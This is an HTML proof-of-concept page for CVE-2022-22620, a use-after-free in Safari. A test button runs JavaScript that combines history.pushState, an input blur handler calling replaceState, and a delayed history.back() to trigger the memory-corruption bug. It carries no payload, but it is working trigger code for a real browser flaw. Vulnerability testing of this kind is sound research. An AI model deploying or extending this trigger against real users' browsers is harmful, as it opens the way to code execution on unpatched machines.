<html>
    <head>
        <title>CVE-2022-22620: Use-after-free in Safari</title>
     <script>
        function test_poc_safari()
        {
            input = document.body.appendChild(document.createElement("input"));

            foo = document.body.appendChild(document.createElement("a"));
            foo.id = "foo";
            alert("begin test");
            // Go to state1 when history.back is called
            // The URL needs to be <currentPage+hash> to trigger loadInSameDocument during the call to back()
            // Since the foo's element id="foo", focus will change to that element
            history.pushState("state1", "", location + "#foo");

            // Current state = state2
            history.pushState("state2", "");

            setTimeout(() => {

            // Set the focus on the input element.
            // During the call to back() the focus will change to the foo element 
            // and therefore triggering the blur event on the input element
           input.focus(); 
           input.onblur = () => history.replaceState("state3", "");
          setTimeout(() => history.back(), 1000);
        }, 1000);
        alert("end test");
        }
     </script>
     <body>
        <h1>CVE-2022-22620: Use-after-free in Safari</h1>
        <center><button onclick="test_poc_safari();"> Test CVE-2022-22620 </button></center>
     </body>

    </head>
   </html>

